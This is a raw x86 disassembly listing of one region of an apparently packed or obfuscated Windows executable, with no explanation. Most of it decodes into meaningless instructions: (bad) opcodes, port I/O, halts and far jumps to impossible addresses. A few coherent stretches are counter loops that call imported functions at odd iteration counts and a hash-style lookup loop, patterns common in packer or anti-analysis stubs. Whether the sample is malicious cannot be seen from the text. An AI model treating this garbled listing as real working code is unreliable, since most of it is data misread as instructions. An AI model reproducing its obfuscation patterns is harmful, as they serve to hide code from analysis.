  40eca7:	sar    ebp,cl
  40eca9:	cmp    DWORD PTR [ebp-0x556d8768],ebx
  40ecaf:	or     BYTE PTR [eax],dh
  40ecb1:	jae    0x40eca8
  40ecb3:	jmp    0x23f261d6
  40ecb8:	sub    eax,0x2129c73d
  40ecbd:	mov    ch,dh
  40ecbf:	gs stos BYTE PTR es:[edi],al
  40ecc1:	inc    eax
  40ecc2:	mov    esi,0x8196e5d1
  40ecc7:	mov    edi,0x78865f32
  40eccc:	inc    ebx
  40eccd:	popf   
  40ecce:	aam    0x81
  40ecd0:	clc    
  40ecd1:	cmp    al,BYTE PTR [esi]
  40ecd3:	jb     0x40ed23
  40ecd5:	repnz pop esp
  40ecd7:	out    dx,eax
  40ecd8:	push   esi
  40ecd9:	fnstenv [edx+edx*4-0x36]
  40ecdd:	out    dx,al
  40ecde:	mov    al,0x3b
  40ece0:	or     DWORD PTR [edi],ebx
  40ece2:	fadd   st,st(1)
  40ece4:	xchg   edx,eax
  40ece5:	hlt    
  40ece6:	jge    0x40ecea
  40ece8:	push   esp
  40ece9:	int3   
  40ecea:	jle    0x40ec7e
  40ecec:	cli    
  40eced:	sub    eax,0x5faba06f
  40ecf2:	sahf   
  40ecf3:	jmp    0x40ed19
  40ecf5:	stc    
  40ecf6:	sbb    eax,0xca6ad0b6
  40ecfb:	jecxz  0x40ed02
  40ecfd:	mov    edi,0xa51c3844
  40ed02:	jle    0x40ed48
  40ed04:	sbb    esi,DWORD PTR ds:0x697f4cde
  40ed0a:	mov    ecx,0xdb26c5c3
  40ed0f:	cmp    eax,DWORD PTR [esi-0x5542bb21]
  40ed15:	repz push edi
  40ed17:	mov    dh,0x2d
  40ed19:	sbb    DWORD PTR [ebp-0x47],ebp
  40ed1c:	add    DWORD PTR [esi-0x77],0x2a066758
  40ed23:	(bad)  
  40ed25:	mov    eax,0x696f3aa4
  40ed2a:	(bad)  
  40ed2b:	(bad)  
  40ed2c:	(bad)  
  40ed2d:	push   cs
  40ed2e:	sub    edx,DWORD PTR [edi]
  40ed30:	mov    ah,0x7c
  40ed32:	(bad)  [edx-0x51ca5ae9]
  40ed38:	adc    DWORD PTR [ebx+0x55],0xd5300343
  40ed3f:	mov    dh,BYTE PTR [eax-0x73]
  40ed42:	jne    0x40ed58
  40ed44:	ror    esi,1
  40ed46:	bound  eax,QWORD PTR [edi+eax*1]
  40ed49:	xchg   ebp,eax
  40ed4a:	dec    esp
  40ed4b:	sub    BYTE PTR [ecx],dh
  40ed4d:	mov    edi,0x531b0648
  40ed52:	outs   dx,BYTE PTR ds:[esi]
  40ed53:	fimul  WORD PTR [eax+0x36]
  40ed56:	add    BYTE PTR [ecx-0x7f],0xe0
  40ed5a:	in     al,dx
  40ed5b:	jo     0x40ed35
  40ed5d:	test   BYTE PTR [edx+esi*8],0xbf
  40ed61:	adc    esp,eax
  40ed63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed64:	cmp    al,BYTE PTR [edi-0x35a5b14f]
  40ed6a:	push   es
  40ed6b:	dec    edx
  40ed6c:	out    0xcf,eax
  40ed6e:	enter  0xbbc7,0x87
  40ed72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed73:	add    edx,DWORD PTR [edi+ebp*4+0x1c930c9a]
  40ed7a:	xor    esi,DWORD PTR [ebx+0x4dfd4229]
  40ed80:	jmp    0x40eded
  40ed82:	(bad)  
  40ed83:	jmp    0x40edab
  40ed85:	jmp    0x73ec:0x8097b3d4
  40ed8c:	(bad)  
  40ed8e:	xchg   esi,edi
  40ed90:	shl    DWORD PTR [edi-0xdce203b],cl
  40ed96:	fld    TBYTE PTR [ebx+edx*4+0x33]
  40ed9a:	ret    0xd2b
  40ed9d:	push   ebx
  40ed9e:	aaa    
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x46b37374]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	fist   WORD PTR gs:[eax]
  40ee79:	jle    0x40eef6
  40ee7b:	mov    cl,bh
  40ee7d:	mov    ebx,0x692c1ab7
  40ee82:	mov    edx,0x4cb4eb41
  40ee87:	adc    eax,0x5ab986c8
  40ee8c:	stos   BYTE PTR es:[edi],al
  40ee8d:	lods   eax,DWORD PTR ds:[esi]
  40ee8e:	push   es
  40ee8f:	loop   0x40eed4
  40ee91:	enter  0x8804,0xf9
  40ee95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee96:	push   es
  40ee97:	lahf   
  40ee98:	jecxz  0x40eea2
  40ee9a:	lahf   
  40ee9b:	sbb    DWORD PTR [ebp-0x47],edi
  40ee9e:	jns    0x40eee9
  40eea0:	mov    al,0x7c
  40eea2:	mov    edx,0x5e99bd1f
  40eea7:	scas   ax,WORD PTR es:[edi]
  40eea9:	shl    dl,0x41
  40eeac:	test   eax,0x40a2d451
  40eeb1:	cmp    ebx,DWORD PTR [edx+0x2f63cd02]
  40eeb7:	das    
  40eeb8:	dec    si
  40eeba:	dec    esi
  40eebb:	shr    ah,1
  40eebd:	push   edx
  40eebe:	sti    
  40eebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eec1:	lahf   
  40eec2:	or     ebx,esp
  40eec4:	aaa    
  40eec5:	mov    dl,0xf
  40eec7:	dec    ebx
  40eec8:	mov    eax,0xe2d01d71
  40eecd:	xchg   ebp,eax
  40eece:	enter  0x9c69,0xce
  40eed2:	mov    ah,0x19
  40eed4:	xchg   BYTE PTR [edx],dl
  40eed6:	sbb    DWORD PTR [ecx],esp
  40eed8:	xor    eax,0x94a8fc53
  40eedd:	iret   
  40eede:	test   eax,0x3b676275
  40eee3:	stc    
  40eee4:	aas    
  40eee5:	xchg   edi,eax
  40eee6:	jle    0x40eee2
  40eee8:	fadd   QWORD PTR [edi-0x72]
  40eeeb:	pop    ss
  40eeec:	enter  0x351e,0x46
  40eef0:	int3   
  40eef1:	inc    esp
  40eef2:	adc    eax,0x282b1818
  40eef7:	xlat   BYTE PTR ds:[ebx]
  40eef8:	pop    es
  40eef9:	les    esp,FWORD PTR [edx]
  40eefb:	cli    
  40eefc:	cmp    al,0x21
  40eefe:	fdiv   st(1),st
  40ef00:	push   0xebe45f97
  40ef05:	push   esi
  40ef06:	push   cs
  40ef07:	call   0x3967:0x67a4c36b
  40ef0e:	fld    TBYTE PTR [eax-0x6d]
  40ef11:	mov    eax,0xfc58d39d
  40ef16:	ins    BYTE PTR es:[edi],dx
  40ef17:	sbb    eax,edx
  40ef19:	icebp  
  40ef1a:	fidiv  WORD PTR [ecx+0x2a4b935a]
  40ef20:	jne    0x40ef17
  40ef22:	pop    esi
  40ef23:	sub    esp,0x71eb6f3
  40ef29:	test   DWORD PTR [ebp*8-0x4f3cc029],eax
  40ef30:	sbb    esp,DWORD PTR [eax+0x758d9ff8]
  40ef36:	jmp    0x40ef5a
  40ef38:	add    esi,DWORD PTR [edx-0x5379db07]
  40ef3e:	shl    BYTE PTR [eax+0x60],0xf7
  40ef42:	mov    bl,BYTE PTR [edi-0x15]
  40ef45:	jmp    0x40efa8
  40ef47:	les    ebx,FWORD PTR [ecx+eiz*2-0x4e]
  40ef4b:	push   esp
  40ef4c:	inc    esi
  40ef4d:	push   ds
  40ef4e:	or     edx,ecx
  40ef50:	xchg   esi,eax
  40ef51:	lods   eax,DWORD PTR ds:[esi]
  40ef52:	shl    BYTE PTR ds:0xaeebc9e3,cl
  40ef58:	push   ss
  40ef59:	push   edx
  40ef5a:	mov    edi,0x5811c8d6
  40ef5f:	aas    
  40ef60:	icebp  
  40ef61:	inc    eax
  40ef62:	sbb    DWORD PTR [ecx+0x4d1d8f],ecx
  40ef68:	ficomp DWORD PTR [ebx-0x1b]
  40ef6b:	mov    bl,0xe3
  40ef6d:	loopne 0x40ef2b
  40ef6f:	call   0x679df605
  40ef74:	push   ecx
  40ef75:	jne    0x40ef51
  40ef77:	dec    eax
  40ef78:	pusha  
  40ef79:	test   al,0x70
  40ef7b:	test   DWORD PTR [ebx+0x42],0x2fbce11d
  40ef82:	retf   0x9a29
  40ef85:	les    ecx,FWORD PTR [esi-0x1b0c9c98]
  40ef8b:	test   eax,0x3eac77d6
  40ef90:	shr    DWORD PTR [esi+0x418cd86c],0x53
  40ef97:	push   eax
  40ef98:	scas   al,BYTE PTR es:[edi]
  40ef99:	pop    ecx
  40ef9a:	int3   
  40ef9b:	xor    ebx,DWORD PTR [ebp+0x6a]
  40ef9e:	das    
  40ef9f:	aam    0x5a
  40efa1:	adc    DWORD PTR [eax-0x2a33d39],eax
  40efa7:	rcr    DWORD PTR [edi+0x55],0x9d
  40efab:	cmp    eax,0xb68e5940
  40efb0:	pop    esi
  40efb1:	lock cmp DWORD PTR [eax+0x57],ebp
  40efb5:	jne    0x40efc5
  40efb7:	cmp    bh,dh
  40efb9:	mov    al,0xbf
  40efbb:	xlat   BYTE PTR ds:[ebx]
  40efbc:	(bad)  
  40efbe:	and    BYTE PTR ds:0x4978a94,dl
  40efc4:	mov    bh,0xd4
  40efc6:	push   cs
  40efc7:	lock add DWORD PTR [ebx-0x38],edx
  40efcb:	lods   al,BYTE PTR ds:[esi]
  40efcc:	test   al,0x8a
  40efce:	inc    esi
  40efcf:	mov    edx,0xf72f7753
  40efd4:	cwde   
  40efd5:	shl    BYTE PTR [edi],cl
  40efd7:	or     edi,DWORD PTR [edx+0x6b]
  40efda:	dec    esi
  40efdb:	dec    edx
  40efdc:	xchg   ebx,eax
  40efdd:	fnstenv [edx+0x4fadbf7f]
  40efe3:	jecxz  0x40efba
  40efe5:	pop    es
  40efe6:	scas   eax,DWORD PTR es:[edi]
  40efe7:	into   
  40efe8:	mov    eax,0x2d6107dd
  40efed:	push   ebx
  40efee:	jg     0x40ef8a
  40eff0:	arpl   WORD PTR [ecx+edx*4-0x4],bp
  40eff4:	cdq    
  40eff5:	add    ecx,DWORD PTR [eax-0x28]
  40eff8:	jb     0x40f023
  40effa:	jecxz  0x40efbe
  40effc:	xchg   edi,eax
  40effd:	mov    eax,0xf7287fc3
  40f002:	gs shl eax,cl
  40f005:	cmp    eax,0xceaf138f
  40f00a:	addr16 inc ebp
  40f00c:	pop    edx
  40f00d:	les    ebp,FWORD PTR [ebx]
  40f00f:	sub    ebp,ebx
  40f011:	out    0x39,al
  40f013:	jnp    0x40f002
  40f015:	pop    ds
  40f016:	xor    BYTE PTR [ebp+0x37641e],dl
  40f01c:	lea    esp,[eax+edi*4-0x1af6c461]
  40f023:	dec    eax
  40f024:	push   ecx
  40f025:	ds inc edi
  40f027:	pop    ebp
  40f028:	lock aad 0xe2
  40f02b:	inc    esi
  40f02c:	test   al,0xf1
  40f02e:	jnp    0x40f04f
  40f030:	jp     0x40efe3
  40f032:	dec    esi
  40f033:	cmc    
  40f034:	push   edx
  40f035:	data16 loope 0x40f01d
  40f038:	inc    eax
  40f039:	jns    0x40f079
  40f03b:	mov    esp,ecx
  40f03d:	ins    BYTE PTR es:[edi],dx
  40f03e:	out    dx,al
  40f03f:	fisttp QWORD PTR [edi-0x41b40bbf]
  40f045:	imul   ecx,DWORD PTR [ecx-0xd],0x5f2a1d21
  40f04c:	sub    BYTE PTR [esi-0x55],ah
  40f04f:	jge    0x40efdc
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xdee71594,ebx
  40f076:	outs   dx,DWORD PTR ds:[esi]
  40f077:	ret    0xa1d6
  40f07a:	jle    0x40f0fa
  40f07c:	jl     0x40f0fb
  40f07e:	jle    0x40f0fe
  40f080:	sar    DWORD PTR [edx-0x58],cl
  40f083:	xchg   ebx,eax
  40f084:	xchg   ebx,eax
  40f085:	mov    esp,DWORD PTR [ebx+0x64]
  40f088:	scas   eax,DWORD PTR es:[edi]
  40f089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f08a:	push   esp
  40f08b:	jno    0x40f09f
  40f08d:	mov    esi,0x76ec0bdf
  40f092:	jl     0x40f070
  40f094:	mov    eax,ds:0xfab5de0d
  40f099:	enter  0x8ecc,0x5d
  40f09d:	push   dx
  40f09f:	lea    eax,es:[edi+0x62]
  40f0a3:	mov    BYTE PTR [esi+0x33],bl
  40f0a6:	cmc    
  40f0a7:	cs call 0xbaef:0xe03d25b4
  40f0af:	aas    
  40f0b0:	adc    al,0xe6
  40f0b2:	fstp   QWORD PTR [ecx]
  40f0b4:	in     eax,dx
  40f0b5:	dec    esi
  40f0b6:	stos   BYTE PTR es:[edi],al
  40f0b7:	mov    ebp,ecx
  40f0b9:	and    al,BYTE PTR [ecx+0x3ec230eb]
  40f0bf:	inc    ebx
  40f0c0:	mov    al,0xb0
  40f0c2:	dec    ebp
  40f0c3:	xor    eax,0x7da0cc80
  40f0c8:	xchg   ecx,eax
  40f0c9:	fsubrp st(4),st
  40f0cb:	xor    DWORD PTR [ecx],esp
  40f0cd:	jnp    0x40f136
  40f0cf:	or     al,0xeb
  40f0d1:	idiv   DWORD PTR [esi+0x410ee4f6]
  40f0d7:	jge    0x40f0ec
  40f0d9:	push   ebp
  40f0da:	lods   al,BYTE PTR ds:[esi]
  40f0db:	cmp    al,0xcf
  40f0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0de:	scas   eax,DWORD PTR es:[edi]
  40f0df:	fdiv   QWORD PTR [esi+0x71]
  40f0e2:	mov    ds:0x41093dfd,al
  40f0e7:	or     eax,0x4474166
  40f0ec:	jbe    0x40f106
  40f0ee:	mov    eax,0x21aa75ac
  40f0f3:	mov    esp,0x91ed39ea
  40f0f8:	sub    DWORD PTR [eax-0x69],ebp
  40f0fb:	push   ds
  40f0fc:	pop    esi
  40f0fd:	sbb    DWORD PTR [esi-0x5a],edx
  40f100:	stos   DWORD PTR es:[edi],eax
  40f101:	fist   WORD PTR [esi+eax*4-0x6e]
  40f105:	int    0xe2
  40f107:	loope  0x40f0d4
  40f109:	inc    ebp
  40f10a:	loopne 0x40f12e
  40f10c:	mov    ebp,ebx
  40f10e:	shl    DWORD PTR [eax+0x7aa37446],1
  40f114:	dec    ecx
  40f115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f116:	mov    ds:0x2194104a,eax
  40f11b:	sub    ah,BYTE PTR [eax+0x58740623]
  40f121:	cli    
  40f122:	int3   
  40f123:	xchg   edx,eax
  40f124:	push   es
  40f125:	js     0x40f0ce
  40f127:	jmp    0xe0654fba
  40f12c:	mov    ebp,0x248e5d4f
  40f131:	sub    BYTE PTR [edi+0x78],dh
  40f134:	jne    0x40f14f
  40f136:	or     esi,DWORD PTR [edi+ebp*2+0x128b6008]
  40f13d:	adc    DWORD PTR [esi+0x5],ebp
  40f140:	in     al,dx
  40f141:	repnz test al,0x9b
  40f144:	adc    DWORD PTR [edi+0x42],0x48303cf2
  40f14b:	sub    ebx,ebp
  40f14d:	and    BYTE PTR [edi-0x2d],ah
  40f150:	sar    dl,0x5e
  40f153:	fisub  DWORD PTR [ebx-0x1a]
  40f156:	leave  
  40f157:	jne    0x40f190
  40f159:	mov    al,ds:0xd332a8ee
  40f15e:	inc    ebp
  40f15f:	cmc    
  40f160:	inc    esp
  40f161:	push   ebx
  40f162:	int3   
  40f163:	aad    0xe0
  40f165:	sbb    eax,0xaefb221b
  40f16a:	sub    BYTE PTR [eax*4-0x5266f655],ah
  40f171:	retf   
  40f172:	cld    
  40f173:	(bad)  
  40f174:	leave  
  40f175:	and    DWORD PTR [esi-0x19],edx
  40f178:	shl    DWORD PTR [eax+0x43fde5e1],1
  40f17e:	cli    
  40f17f:	and    al,0xf7
  40f181:	data16 lahf 
  40f183:	imul   edi,DWORD PTR [esi-0x6d],0xe087eb88
  40f18a:	xlat   BYTE PTR ds:[ebx]
  40f18b:	(bad)  
  40f18c:	fst    DWORD PTR [eax]
  40f18e:	ins    DWORD PTR es:[edi],dx
  40f18f:	pop    ecx
  40f190:	inc    esp
  40f191:	add    al,0x22
  40f193:	test   BYTE PTR [edi],ch
  40f195:	dec    ebx
  40f196:	popa   
  40f197:	dec    edi
  40f198:	loop   0x40f1ac
  40f19a:	jo     0x40f128
  40f19c:	ret    0x6197
  40f19f:	cs jae 0x40f1d4
  40f1a2:	(bad)  
  40f1a3:	push   ecx
  40f1a4:	fwait
  40f1a5:	hlt    
  40f1a6:	fwait
  40f1a7:	xor    cl,BYTE PTR es:[edx-0x5e]
  40f1ab:	leave  
  40f1ac:	push   eax
  40f1ad:	adc    DWORD PTR [ebp-0x4b60d40c],ebp
  40f1b3:	addr16 inc ebx
  40f1b5:	stos   DWORD PTR es:[edi],eax
  40f1b6:	cmp    BYTE PTR [edx],al
  40f1b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b9:	shr    ecx,cl
  40f1bb:	rep ins BYTE PTR es:[edi],dx
  40f1bd:	pop    eax
  40f1be:	push   0xffffff9f
  40f1c0:	cmp    edx,DWORD PTR [ecx-0x734ec701]
  40f1c6:	add    esp,DWORD PTR [ebx+0x6e]
  40f1c9:	pop    edx
  40f1ca:	popa   
  40f1cb:	xchg   esp,eax
  40f1cc:	mov    ebx,0xabace489
  40f1d1:	repnz shl BYTE PTR [ebx-0x31cc5d69],0x20
  40f1d9:	dec    edi
  40f1da:	nop    DWORD PTR [ecx+0x8134996]
  40f1e1:	adc    ch,BYTE PTR [ebp+0x46]
  40f1e4:	test   BYTE PTR [ecx],cl
  40f1e6:	pop    edx
  40f1e7:	pop    esp
  40f1e8:	shl    DWORD PTR [ebx+eax*4+0x24c6819d],0xd2
  40f1f0:	lods   al,BYTE PTR ds:[esi]
  40f1f1:	fucomi st,st(6)
  40f1f3:	push   ebp
  40f1f4:	xor    cl,ah
  40f1f6:	shr    DWORD PTR [esi+0x2d],1
  40f1f9:	js     0x40f182
  40f1fb:	mov    dh,0xd9
  40f1fd:	jmp    0x40f1e7
  40f1ff:	mov    ds:0x124e8739,al
  40f204:	push   ss
  40f205:	shl    DWORD PTR [eax-0x4ecf079e],0x79
  40f20c:	push   edx
  40f20d:	lds    esp,FWORD PTR fs:[ebp+esi*8+0x64]
  40f212:	int3   
  40f213:	out    dx,al
  40f214:	push   0xe837291e
  40f219:	adc    al,0xe7
  40f21b:	mov    eax,0x9e39d757
  40f220:	xchg   ebx,eax
  40f221:	sbb    eax,0xbd40b031
  40f226:	ficom  WORD PTR [ecx+0x38]
  40f229:	test   DWORD PTR [ecx-0x7622237f],eax
  40f22f:	retf   0x5306
  40f232:	or     esi,DWORD PTR [edi+ebp*8-0x49]
  40f236:	bound  ebp,QWORD PTR [ebp+ebp*2+0xc]
  40f23a:	scas   eax,DWORD PTR es:[edi]
  40f23b:	scas   al,BYTE PTR es:[edi]
  40f23c:	sti    
  40f23d:	add    al,BYTE PTR [eax]
  40f23f:	mov    dl,0x24
  40f241:	fld1   
  40f243:	loopne 0x40f246
  40f245:	adc    DWORD PTR [ecx+0x6535db6e],0x4a3ead59
  40f24f:	aas    
  40f250:	fld    TBYTE PTR [edx+esi*1]
  40f253:	xchg   edx,eax
  40f254:	push   ecx
  40f255:	loopne 0x40f2b2
  40f257:	adc    DWORD PTR [esp+eax*2+0x13eeadb6],esi
  40f25e:	mov    esi,0x72e5a5c5
  40f263:	push   0xffffffaa
  40f265:	pop    es
  40f266:	fwait
  40f267:	ins    BYTE PTR es:[edi],dx
  40f268:	ins    DWORD PTR es:[edi],dx
  40f269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f26a:	fisttp WORD PTR [edi]
  40f26c:	jge    0x40f21c
  40f26e:	ret    
  40f26f:	imul   esp,DWORD PTR [ecx],0x79f749c1
  40f275:	stos   DWORD PTR es:[edi],eax
  40f276:	in     al,0xe
  40f278:	inc    esp
  40f279:	cmc    
  40f27a:	inc    ecx
  40f27b:	lea    esp,[esi]
  40f27d:	xor    eax,0xd2d61673
  40f282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f283:	dec    BYTE PTR [edi+0x869d71e]
  40f289:	pop    ebx
  40f28a:	mov    eax,0x38143662
  40f28f:	add    DWORD PTR [esi+0x35],esp
  40f292:	retf   0x9f9
  40f295:	mov    ds:0x179c854a,eax
  40f29a:	inc    esp
  40f29b:	std    
  40f29c:	data16 fiadd WORD PTR [esi+0x1c]
  40f2a0:	mov    BYTE PTR [esi],ch
  40f2a2:	data16 add ch,BYTE PTR ds:[edx+0x46]
  40f2a7:	jg     0x40f300
  40f2a9:	aam    0xea
  40f2ab:	sbb    DWORD PTR [esi],esi
  40f2ad:	loopne 0x40f245
  40f2af:	sub    eax,0xbd0ad1b7
  40f2b4:	fild   QWORD PTR [eax-0x40]
  40f2b8:	je     0x40f25c
  40f2ba:	mov    al,ds:0x7ac09261
  40f2bf:	fsub   QWORD PTR [ecx]
  40f2c1:	push   ss
  40f2c2:	dec    ecx
  40f2c3:	ret    0x86df
  40f2c6:	jbe    0x40f270
  40f2c8:	lds    ecx,FWORD PTR ds:0xd7e957ad
  40f2ce:	mov    esp,DWORD PTR [eax-0x58]
  40f2d1:	mov    ah,0x8e
  40f2d3:	and    eax,0x437874b3
  40f2d8:	test   eax,0x99d1c1f0
  40f2dd:	jge    0x40f321
  40f2df:	add    ch,BYTE PTR [esi+0x52]
  40f2e2:	pop    esi
  40f2e3:	aam    0xec
  40f2e5:	dec    eax
  40f2e6:	jno    0x40f30e
  40f2e8:	mov    ch,0x4f
  40f2ea:	push   es
  40f2eb:	push   ebx
  40f2ec:	fcmovnu st,st(2)
  40f2ee:	xor    edx,ebp
  40f2f0:	shl    BYTE PTR [ebx+0xda1cd28],cl
  40f2f6:	stc    
  40f2f7:	adc    eax,0xd908cc81
  40f2fc:	das    
  40f2fd:	lahf   
  40f2fe:	aas    
  40f2ff:	lods   al,BYTE PTR ds:[esi]
  40f300:	sbb    DWORD PTR [ebp-0xa55fd],edx
  40f306:	and    BYTE PTR [eax+0x6aa48fde],al
  40f30c:	xor    BYTE PTR [ebx+0x65c806ea],dl
  40f312:	data16 shl BYTE PTR [esi+0x9],0xfd
  40f317:	dec    eax
  40f318:	mov    eax,ds:0x472cbbae
  40f31d:	and    al,0x94
  40f31f:	addr16 push ebx
  40f321:	lods   al,BYTE PTR ds:[esi]
  40f322:	mov    eax,ds:0x197b1f04
  40f327:	jmp    0x40f36b
  40f329:	aaa    
  40f32a:	mov    edx,0x211b267e
  40f32f:	and    eax,0x7daf861c
  40f334:	int3   
  40f335:	dec    eax
  40f336:	gs in  eax,dx
  40f338:	mov    DWORD PTR [edx],ecx
  40f33a:	jo     0x40f364
  40f33c:	jecxz  0x40f396
  40f33e:	push   edi
  40f33f:	mov    eax,0xe1aadf16
  40f344:	xchg   esp,eax
  40f345:	adc    BYTE PTR [esi],bl
  40f347:	sbb    DWORD PTR [esi-0x5a],ebx
  40f34a:	lds    ecx,FWORD PTR [ecx+0x3b3034c]
  40f350:	fstp   DWORD PTR [edi+ecx*2+0x62f4e4c4]
  40f357:	push   cs
  40f358:	pop    ebp
  40f359:	out    0xd7,eax
  40f35b:	stos   BYTE PTR es:[edi],al
  40f35c:	push   esi
  40f35d:	push   0xf7da8b83
  40f362:	gs jmp 0x40f2e7
  40f365:	and    BYTE PTR [ecx],bh
  40f367:	cmp    edi,0xffffffb1
  40f36a:	mov    ah,0x9
  40f36c:	cmp    esi,DWORD PTR [edi]
  40f36e:	sub    dl,BYTE PTR [ecx]
  40f370:	retf   
  40f371:	fild   WORD PTR ds:0x73911194
  40f377:	cmp    eax,0x79906882
  40f37c:	inc    edi
  40f37d:	xchg   BYTE PTR [eax-0x47b02028],dh
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	cmp    BYTE PTR [ebx+0x0],al
  40f38d:	add    BYTE PTR [eax],al
  40f38f:	add    BYTE PTR [eax],al
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
